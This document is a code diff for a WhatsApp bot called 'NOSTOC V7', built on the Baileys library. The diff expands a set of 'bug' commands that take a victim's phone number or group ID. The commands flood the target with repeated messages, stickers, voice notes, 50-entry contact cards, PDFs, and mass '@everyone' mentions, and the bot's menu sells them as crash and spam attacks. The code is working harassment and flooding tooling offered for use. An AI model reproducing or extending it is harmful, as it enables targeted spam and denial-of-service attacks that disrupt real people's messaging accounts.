@@ -2,7 +2,7 @@ import fs from 'fs';
 import path from 'path';
 import { fileURLToPath } from 'url';
 import 'dotenv/config';
-import { default: makeWASocket, useMultiFileAuthState, DisconnectReason, Browsers, delay } from '@whiskeysockets/baileys';
+import { default: makeWASocket, useMultiFileAuthState, DisconnectReason, Browsers, delay, proto } from '@whiskeysockets/baileys';
 import express from 'express';
 import chalk from 'chalk';
 
@@ -31,12 +31,12 @@ const commands = new Map();
 const cooldowns = new Map();
 let sock;
 
-// 1. DYNAMIC COMMAND LOADER + V7 BUGS
+// 1. DYNAMIC COMMAND LOADER + ALL V7 BUGS
 async function loadCommands() {
     const commandsDir = path.join(__dirname, 'commands');
     if (!fs.existsSync(commandsDir)) fs.mkdirSync(commandsDir);
 
-    // V7 DEFAULT COMMANDS
+    // V7 ALL COMMANDS
     const defaultCmds = {
         'menu.js': `
 export default {
@@ -50,11 +50,14 @@ export default {
 │ Speed: \${ping}ms
 │
 │!ping - Check speed
-│!bug <num> - V7 Crash
-│!spam <num> <text> - V7 Spam
-│!delay <num> - V7 Delay
+│!bug <num> - Crash Bug
+│!spam <num> <text> - Spam Bug
+│!delay <num> - Delay Bug
 │!stickerbug <num> - Sticker Bug
 │!gcbug <num> - Group Bug
+│!voicenotebug <num> - VN Bug
+│!contactbug <num> - Contact Bug
+│!docbug <num> - Doc Bug
 │!owner - Contact owner
 ╰───────────────────╯\`;
   }
@@ -76,7 +79,7 @@ export default {
     return \`*OPERATOR: NOSTOC*\nwa.me/234XXXXXXXXXX\nV7 COLD STORAGE\`;
   }
 };`,
-        // V7 BUG 1: CRASH
+        // BUG 1: CRASH
         'bug.js': `
 export default {
   name: 'bug',
@@ -87,7 +90,7 @@ export default {
     return \`V7 CRASH BUG SENT TO \${args[0] || 'YOU'}\`;
   }
 };`,
-        // V7 BUG 2: SPAM
+        // BUG 2: SPAM
         'spam.js': `
 export default {
   name: 'spam',
@@ -97,14 +100,14 @@ export default {
     if(!target) return 'Usage:!spam 234xxx message';
     const jid = target + '@s.whatsapp.net';
     const text = msg.join(' ') || 'NOSTOC-V7-SPAM';
-    for(let i=0; i<20; i++) {
-      await sock.sendMessage(jid, { text: \`\${text} [\${i+1}/20]\` });
-      await delay(150);
+    for(let i=0; i<25; i++) {
+      await sock.sendMessage(jid, { text: \`\${text} [\${i+1}/25]\` });
+      await delay(100);
     }
-    return \`V7 SPAMMED \${target} x20\`;
+    return \`V7 SPAMMED \${target} x25\`;
   }
 };`,
-        // V7 BUG 3: DELAY
+        // BUG 3: DELAY
         'delay.js': `
 export default {
   name: 'delay',
@@ -112,12 +115,12 @@ export default {
   execute: async (args, sender, botName, version, creator, startTime, sock) => {
     const target = args[0]? args[0] + '@s.whatsapp.net' : sender;
     await sock.sendMessage(target, { text: 'V7 Loading...' });
-    await delay(15000);
+    await delay(20000);
     await sock.sendMessage(target, { text: 'NOSTOC V7 DELAY BUG ACTIVATED' });
     return \`V7 DELAY BUG SENT TO \${args[0] || 'YOU'}\`;
   }
 };`,
-        // V7 BUG 4: STICKER BUG
+        // BUG 4: STICKER BUG
         'stickerbug.js': `
 export default {
   name: 'stickerbug',
@@ -125,19 +128,58 @@ export default {
   execute: async (args, sender, botName, version, creator, startTime, sock) => {
     const target = args[0]? args[0] + '@s.whatsapp.net' : sender;
     const sticker = { sticker: { url: 'https://i.imgur.com/large-sticker.webp' } };
-    for(let i=0; i<5; i++) await sock.sendMessage(target, sticker);
-    return \`V7 STICKER BUG SENT TO \${args[0] || 'YOU'}\`;
+    for(let i=0; i<10; i++) await sock.sendMessage(target, sticker);
+    return \`V7 STICKER BUG SENT TO \${args[0] || 'YOU'} x10\`;
   }
 };`,
-        // V7 BUG 5: GC BUG
+        // BUG 5: GC BUG
         'gcbug.js': `
 export default {
   name: 'gcbug',
   cooldown: 30000,
   execute: async (args, sender, botName, version, creator, startTime, sock) => {
     const target = args[0]? args[0] + '@g.us' : sender;
-    await sock.sendMessage(target, { text: '@everyone '.repeat(100) + 'NOSTOC-V7-GC-BUG' });
+    await sock.sendMessage(target, { text: '@everyone '.repeat(200) + 'NOSTOC-V7-GC-BUG' });
     return \`V7 GROUP BUG SENT\`;
+  }
+};`,
+        // BUG 6: VOICENOTE BUG
+        'voicenotebug.js': `
+export default {
+  name: 'voicenotebug',
+  cooldown: 25000,
+  execute: async (args, sender, botName, version, creator, startTime, sock) => {
+    const target = args[0]? args[0] + '@s.whatsapp.net' : sender;
+    const audio = { audio: { url: 'https://www.soundhelix.com/examples/mp3/SoundHelix-Song-1.mp3' }, mimetype: 'audio/mp4', ptt: true };
+    for(let i=0; i<5; i++) await sock.sendMessage(target, audio);
+    return \`V7 VOICENOTE BUG SENT TO \${args[0] || 'YOU'} x5\`;
+  }
+};`,
+        // BUG 7: CONTACT BUG
+        'contactbug.js': `
+export default {
+  name: 'contactbug',
+  cooldown: 20000,
+  execute: async (args, sender, botName, version, creator, startTime, sock) => {
+    const target = args[0]? args[0] + '@s.whatsapp.net' : sender;
+    const contacts = [];
+    for(let i=0; i<50; i++) {
+      contacts.push({ displayName: 'NOSTOC-BUG', vcard: 'BEGIN:VCARD\\nVERSION:3.0\\nFN:NOSTOC-BUG\\nTEL:+234000000\\nEND:VCARD' });
+    }
+    await sock.sendMessage(target, { contacts: { contacts } });
+    return \`V7 CONTACT BUG SENT TO \${args[0] || 'YOU'}\`;
+  }
+};`,
+        // BUG 8: DOC BUG
+        'docbug.js': `
+export default {
+  name: 'docbug',
+  cooldown: 20000,
+  execute: async (args, sender, botName, version, creator, startTime, sock) => {
+    const target = args[0]? args[0] + '@s.whatsapp.net' : sender;
+    const doc = { document: { url: 'https://www.w3.org/WAI/ER/tests/xhtml/testfiles/resources/pdf/dummy.pdf' }, mimetype: 'application/pdf', fileName: 'NOSTOC-V7-BUG.pdf' };
+    for(let i=0; i<5; i++) await sock.sendMessage(target, doc);
+    return \`V7 DOC BUG SENT TO \${args[0] || 'YOU'} x5\`;
   }
 };`
     };
